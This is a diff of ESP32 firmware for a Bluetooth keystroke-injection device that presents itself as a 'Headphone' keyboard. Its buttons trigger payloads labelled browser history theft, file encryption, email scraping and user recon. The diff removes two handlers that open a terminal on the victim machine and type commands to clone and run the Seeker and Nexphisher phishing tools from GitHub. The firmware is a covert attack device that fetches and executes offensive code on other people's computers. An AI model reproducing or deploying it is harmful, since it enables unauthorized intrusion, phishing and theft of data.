@@ -7,12 +7,10 @@
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Chrome History/Downloads)
 #define BUTTON_8_PIN 25 // Button 8 (Trigger: HiddenWave)
 #define BUTTON_9_PIN 27 // Button 9 (Trigger: CanaryTokensDetector)
-#define BUTTON_10_PIN 26 // Button 10 (Trigger: Seeker)
 #define BUTTON_11_PIN 32 // Button 11 (Trigger: File Encryption)
 #define BUTTON_12_PIN 33 // Button 12 (Trigger: Email Scraper)
 #define BUTTON_13_PIN 14 // Button 13 (Trigger: Evil Eye)
 #define BUTTON_14_PIN 15 // Button 14 (Trigger: Userrecon)
-#define BUTTON_15_PIN 13 // Button 15 (Trigger: Nexphisher)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -24,12 +22,10 @@ bool lastState4 = HIGH;
 bool lastState7 = HIGH;
 bool lastState8 = HIGH;
 bool lastState9 = HIGH;
-bool lastState10 = HIGH;
 bool lastState11 = HIGH;
 bool lastState12 = HIGH;
 bool lastState13 = HIGH;
 bool lastState14 = HIGH;
-bool lastState15 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -57,12 +53,10 @@ void setup() {
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
   pinMode(BUTTON_9_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_10_PIN, INPUT_PULLUP);
   pinMode(BUTTON_11_PIN, INPUT_PULLUP);
   pinMode(BUTTON_12_PIN, INPUT_PULLUP);
   pinMode(BUTTON_13_PIN, INPUT_PULLUP);
   pinMode(BUTTON_14_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_15_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -79,12 +73,10 @@ void loop() {
     bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
     bool state9 = digitalRead(BUTTON_9_PIN);
-    bool state10 = digitalRead(BUTTON_10_PIN);
     bool state11 = digitalRead(BUTTON_11_PIN);
     bool state12 = digitalRead(BUTTON_12_PIN);
     bool state13 = digitalRead(BUTTON_13_PIN);
     bool state14 = digitalRead(BUTTON_14_PIN);
-    bool state15 = digitalRead(BUTTON_15_PIN);
 
     // Button 1: Password Manager (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -237,33 +229,6 @@ void loop() {
       Serial.println("CanaryTokensDetector Payload executed");
     }
 
-     // Button 10: Seeker (Pin 26)
-    if (lastState10 == HIGH && state10 == LOW) {
-      Serial.println("Button 10: Seeker (Pin 26)");
-      bleKeyboard.press(KEY_LEFT_CTRL); 
-      bleKeyboard.press(KEY_LEFT_ALT); 
-      bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
-      Serial.println("Terminal opened");
-      sendString("git clone https://github.com/thewhiteh4t/seeker.git", 50); delay(4000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500); 
-      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
-      Serial.println("Git clone completed");
-      sendString("cd seeker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500); 
-      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
-      Serial.println("Changed to Seeker directory");
-      sendString("chmod +x install.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500); 
-      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
-      Serial.println("Set executable permissions");
-      sendString("./install.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500);
-      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
-      Serial.println("Seeker Payload executed");
-    }
-
      // Button 11: File Encryption (Pin 32)
     if (lastState11 == HIGH && state11 == LOW) {
       Serial.println("Button 11: File Encryption (Pin 32)");
@@ -368,37 +333,6 @@ void loop() {
       Serial.println("Userrecon Payload executed");
     }
 
-   // Button 15: Nexphisher (Pin 13)
-    if (lastState15 == HIGH && state15 == LOW) {
-      Serial.println("Button 15: Nexphisher (Pin 13)");
-      bleKeyboard.press(KEY_LEFT_CTRL); 
-      bleKeyboard.press(KEY_LEFT_ALT); 
-      bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
-      Serial.println("Terminal opened");
-      sendString("git clone https://github.com/htr-tech/nexphisher.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500); 
-      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
-      Serial.println("Git clone completed");
-      sendString("cd nexphisher", 50); delay(1000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500); 
-      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
-      Serial.println("Changed to Nexphisher directory");
-      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500); 
-      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
-      Serial.println("Set executable permissions");
-      sendString("./setup", 50); delay(3000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500);
-      bleKeyboard.releaseAll(); delay(40000); // Increased for script startup
-      sendString("./nexphisher", 50); delay(3000); // 50ms per char, 1000ms before RETURN
-      bleKeyboard.press(KEY_RETURN); delay(500);
-      bleKeyboard.releaseAll(); delay(3000);
-      Serial.println("Nexphisher Payload executed");
-    }
-
-
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -406,15 +340,14 @@ void loop() {
     lastState7 = state7;
     lastState8 = state8;
     lastState9 = state9;
-    lastState10 = state10;
     lastState11 = state11;
     lastState12 = state12;
     lastState13 = state13;
     lastState14 = state14;
-    lastState15 = state15;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
   delay(50); // Debounce/stability
 }
+
 
